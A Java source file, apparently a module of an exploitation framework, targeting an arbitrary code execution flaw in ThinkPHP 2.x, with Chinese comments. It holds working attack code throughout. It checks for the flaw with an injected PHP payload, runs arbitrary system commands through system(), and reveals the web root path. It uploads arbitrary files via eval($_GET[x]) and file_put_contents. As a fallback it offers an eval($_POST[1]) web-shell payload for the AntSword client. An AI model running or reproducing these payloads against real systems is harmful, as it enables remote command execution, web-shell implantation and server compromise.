package fun.fireline.exp.php.thinkphp;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTool;

import java.net.URLEncoder;
import java.util.Base64;
import java.util.UUID;

/**
 * @author yhy
 * @date 2021/8/18 20:05
 * @github https://github.com/yhy0
 * ThinkPHP 2.x 任意代码执行漏洞
 */

public class ThinkPHP2x implements ExploitInterface {
    private String target = null;

    private boolean isVul = false;

    // 检测漏洞是否存在
    @Override
    public boolean checkVul(String url) {
        this.target = url;
        // 这里可以通过判断对方是否执行了 md5 计算，输出 202cb962ac59075b964b07152d234b70 来验证漏洞是否存在
        String check_payload = "/index.php?s=/index/index/name/${@print(md5(123))}";
        // post 请求，根据不同的exp，可能需要不同的请求方式，看需更改，请求方式基本都实现了，若有遗漏，请提交issues
        try {
            // 使用 src/main/java/fun/fireline/tools/HttpTool.java 工具包中的 get 方法提交
            // 注意 这要用 try  catch 捕获一下异常
            String result = HttpTool.getHttpReuest(this.target + check_payload, "UTF-8");
            // 看回显，是否存在 202cb962ac59075b964b07152d234b70
            boolean flag = result.contains("202cb962ac59075b964b07152d234b70");
            if(flag) {
                this.isVul = true;  // 存在漏洞
            }
            return flag;

        } catch (Exception e) {
            // 输出错误日志
            logger.error(e);
        }

        return false;
    }

    // 命令执行
    @Override
    public String exeCmd(String cmd, String encoding) {
        String payload = "/index.php?s=/index/index/name/${@print(system(payload))}";
        try {
            // 替换payload 中的 payload 字符为要执行的命令
            payload = payload.replace("payload", cmd);
            String result = HttpTool.getHttpReuest(this.target + payload, "UTF-8");
            return result.split("<!DOCTYPE html")[0];

        } catch (Exception e) {
            logger.error(e);
        }
        return "fail";
    }

    // 获取当前的web路径，有最好，没有也无所谓
    @Override
    public String getWebPath() {
        String payload = "/index.php?s=/index/index/name/${@print(realpath(__ROOT__))}";
        try {
            String result = HttpTool.getHttpReuest(this.target + payload, "UTF-8");
            // 这个payload会把 html网页也给输出，这里分割简单去除一下
            return result.split("<!DOCTYPE html")[0];

        } catch (Exception e) {
            logger.error(e);
        }
        return "命令执行失败";
    }

    @Override
    public String uploadFile(String fileContent, String filename, String platform) throws Exception {
        String result = "";
        // 对文件 base64 编码
        String base64Data = Base64.getEncoder().encodeToString(fileContent.getBytes());
        // 注意一下，需要对 base64 编码后的在进行一次url编码，
        base64Data = URLEncoder.encode(base64Data, "UTF-8" );

        String payload = "/index.php?s=/sd/iex/xxx/${@eval($_GET[x])}&x=file_put_contents('" + filename + "',base64_decode('" + base64Data + "'));";

        HttpTool.getHttpReuest(this.target + payload, "UTF-8");

        // 上传后，访问一次上传的文件，看返回值是否为200来判断是否上传成功
        int status = HttpTool.getHttpURLConnection(this.target + "/" + filename).getResponseCode();

        System.out.println(this.target + "/" + filename);
        System.out.println(status);
        if(status == 200) {
            result = "上传成功! 路径： " + this.target + "/" + filename;
        } else {
            result =  "上传失败， 请用这个payload，蚁剑连接试一下 /index.php?s=/index/index/name/${${@eval($_POST[1])}}";
        }

        return result;
    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
